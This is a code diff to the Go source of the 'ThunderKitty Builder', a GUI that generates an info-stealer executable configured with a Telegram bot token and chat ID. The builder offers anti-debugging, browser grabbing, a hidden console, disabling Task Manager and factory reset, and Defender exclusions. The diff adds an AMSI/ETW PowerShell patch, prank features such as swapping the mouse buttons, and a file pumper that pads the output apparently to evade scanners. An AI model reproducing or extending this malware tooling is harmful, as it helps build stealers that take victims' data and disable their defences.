@@ -5,6 +5,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 
 	"fyne.io/fyne/v2"
 
@@ -13,7 +14,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL string) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell bool) {
 	content := fmt.Sprintf(`
 package main
 
@@ -26,6 +27,7 @@ import (
 	"ThunderKitty-Grabber/utils/taskmanager"
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
+	"ThunderKitty-Grabber/utils/powershellpatcher"
 	"fmt"
 	"os/exec"
 )
@@ -78,8 +80,27 @@ func main() {
 	} else {
 		fmt.Println("Open website not enabled")
 	}
+	
+	ttsMessage := "%s"
+	if ttsMessage != "" {
+		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
+	} else {
+		fmt.Println("TTS not enabled")
+	}
+
+	if %t {
+		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
+	} else {
+		fmt.Println("Swap mouse not enabled")
+	}
+
+	if %t {
+		PowerShellPatcher.Patch()
+	} else {
+		fmt.Println("PowerShell patcher not enabled")
+	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -110,15 +131,39 @@ func main() {
 	fmt.Println("Build successful")
 }
 
+func pumpExecutable(path string, size int) {
+	file, err := os.ReadFile(path)
+	if err != nil {
+		panic(err)
+	}
+
+	size = size * 1024 * 1024 // Convert to MB
+
+	pumpAmount := size - len(file)
+	if pumpAmount <= 0 {
+		return
+	}
+
+	zeroBytes := make([]byte, pumpAmount)
+	err = os.WriteFile(path, append(file, zeroBytes...), 0600)
+	if err != nil {
+		return
+	}
+
+	return
+}
+
 func main() {
 	a := app.New()
 	w := a.NewWindow("ThunderKitty Builder")
 
-	telebottokenEntry := widget.NewEntry()
-	telebottokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
+	// Creating all the widgets
+	// Grabber Widgets
+	telegramBotTokenEntry := widget.NewEntry()
+	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
 
-	telechatidEntry := widget.NewEntry()
-	telechatidEntry.SetPlaceHolder("Enter Telegram Chat ID")
+	telegramChatIdEntry := widget.NewEntry()
+	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")
 
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
@@ -126,32 +171,77 @@ func main() {
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
+	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
 
+	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
-	openSiteEntry.SetPlaceHolder("Open website (leave blank for none)")
+	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
+	speakTTSEntry := widget.NewEntry()
+	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
+	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
 
+	// File Pumper Widgets
+	filePumperEntry := widget.NewEntry()
+	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")
+
+	// Build button
 	buildButton := widget.NewButton("Build", func() {
-		telebottoken := telebottokenEntry.Text
-		telechatid := telechatidEntry.Text
+
+		// Delete old file
+		os.Remove("main.exe")
+
+		// Build the new one
+		telebottoken := telegramBotTokenEntry.Text
+		telechatid := telegramChatIdEntry.Text
 		openSiteURL := openSiteEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL)
+		speakTTSMessage := speakTTSEntry.Text
+		filePumperSize := filePumperEntry.Text
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)
+
+		// Pumper
+		if filePumperSize != "" {
+			pumpSize, err := strconv.Atoi(filePumperSize)
+			if err != nil {
+				panic(err)
+			}
+			
+			pumpExecutable("main.exe", pumpSize)
+		}
 	})
 
-	form := container.NewVBox(
+	grabberSettings := container.NewVBox(
 		widget.NewLabel("ThunderKitty Configuration"),
-		telebottokenEntry,
-		telechatidEntry,
+		telegramBotTokenEntry,
+		telegramChatIdEntry,
 		enableAntiDebug,
 		enableFakeError,
 		enableBrowsers,
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
-		openSiteEntry,
+		patchPowershell,
 		buildButton,
 	)
 
-	w.SetContent(form)
-	w.Resize(fyne.NewSize(400, 350))
+	trollwareSettings := container.NewVBox(
+		widget.NewLabel("Trollware Configuration"),
+		openSiteEntry,
+		speakTTSEntry,
+		enableSwapMouse,
+	)
+
+	filePumperSettings := container.NewVBox(
+		widget.NewLabel("File Pumper Configuration"),
+		filePumperEntry,
+	)
+
+	tabs := container.NewAppTabs(
+		container.NewTabItem("Grabber Configuration", grabberSettings),
+		container.NewTabItem("Trollware Configuration", trollwareSettings),
+		container.NewTabItem("File Pumper", filePumperSettings),
+	)
+
+	w.SetContent(tabs)
+	w.Resize(fyne.NewSize(500, 350))
 	w.ShowAndRun()
 }
